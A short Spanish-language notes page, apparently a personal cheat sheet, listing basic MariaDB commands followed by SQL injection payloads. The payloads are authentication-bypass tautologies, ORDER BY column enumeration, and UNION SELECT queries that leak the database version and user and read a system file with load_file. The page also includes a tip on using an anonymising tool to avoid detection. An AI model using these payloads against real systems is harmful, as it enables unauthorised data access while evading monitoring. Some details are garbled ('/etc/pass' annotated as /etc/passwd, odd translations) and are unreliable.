---
title: sqlInjection
published: true
---


* MariaDb sql:
<br>
<p>Use <font color="lime">anonsruf </font>para no ser detectado</p>
<br>
```python

mysql -u{useraname} -p{password} # Conectar a la base de datos.

show databases; # Muestra la base de datos actuales.

use [database_name]; # Usa la base de datos seleccionada.

show tables; # Muestra las tablas de la base de datos.

describe [table_name]; # Muestra la descripcion de una tabla.

select * from [table_name]; # Muestra todo el contenido de una tabla.


create table users(id int auto_increment PRIMARY KEY, username varchar(32), password varchar(32), vip varchar(32)); # Creacion de tabla.

insert into users(username, password, vip) values("admin", "adminpass$!-?", "No aplica"); # Insertar valores en una tabla creada.

where = done
select = seleccion
from = de

	* SQL INJECTION

'or 1 = 1- --

'or 1 = 1#

select * from users where username='admin'or 1=1;-- -; # Listar todos los datos de una tabla.

select * from users where username='admin'order by 5; # Enumerar la cantidad de columnas en una tabla, en este caso el tope era 4 es decir que dara un fallo.

select * from users where username='admin'union select version(),database(),user(),NULL; # Muestra la version,nombre BD, usuario, NULL 'nada'.

select * from users where username='admin'union select load_file('/etc/pass'),NULL,NULL; # Carga el archivo /etc/passwd para poder verlo.

@@version # alternativas a version()


```






